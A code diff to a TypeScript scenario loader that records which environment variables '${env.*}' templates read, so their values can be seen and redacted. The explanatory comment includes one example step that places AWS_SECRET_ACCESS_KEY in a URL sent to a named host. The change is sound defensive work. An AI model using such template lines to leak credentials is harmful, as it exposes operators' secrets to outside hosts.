@@ -48,6 +48,38 @@ export function loadScenarioFile(filePath: string): Scenario {
  *   ${stripe.card_number}   — Stripe test card values from env
  *   ${store.key}            — values stashed by previous steps (e.g. temp_inbox_address)
  */
+/**
+ * Every environment variable a scenario has interpolated, in load order.
+ *
+ * `${env.X}` resolves against the whole of `process.env` with no allowlist, so
+ * a scenario can read any variable the process can and place it in a URL, an
+ * `act` instruction, or a `computer_use` task. Verified: a step declaring
+ * `visit: https://example.test/?k=${env.AWS_SECRET_ACCESS_KEY}` sends the value
+ * to whatever host the scenario names.
+ *
+ * That is a reasonable capability for a file the operator wrote. It is not
+ * reasonable for one they copied — from a team repository, a template, an
+ * example bundle — which is exactly what scenario files are.
+ *
+ * Narrowing what `${env.*}` can reach would break existing scenarios, so this
+ * does not do that. It records which variables were read so the operator can
+ * see it, and so their values can be added to the redaction patterns: only nine
+ * specific keys are auto-redacted today, and AWS_SECRET_ACCESS_KEY,
+ * GITHUB_TOKEN and DATABASE_URL are not among them.
+ */
+const interpolatedEnvKeys = new Set<string>();
+
+/** Names of the environment variables scenarios have read so far. */
+export function readInterpolatedEnvKeys(): string[] {
+  return [...interpolatedEnvKeys];
+}
+
+/** Test seam: the record is process-global otherwise. */
+export function _resetInterpolatedEnvKeysForTests(): void {
+  interpolatedEnvKeys.clear();
+}
+
+
 export function substituteTemplate(
   input: string,
   context: {
@@ -76,8 +108,12 @@ export function substituteTemplate(
         return String(value);
       }
       if (root === "env" && context.env) {
-        const key = rest.join(".");
-        return context.env[key] ?? _match;
+          const key = rest.join(".");
+          const value = context.env[key];
+          // Only record a hit: an unresolved `${env.X}` is left literal and
+          // nothing leaves the process, so recording it would be noise.
+          if (value !== undefined) interpolatedEnvKeys.add(key);
+          return value ?? _match;
       }
       if (root === "stripe" && context.stripe) {
         return context.stripe[expr] ?? _match;
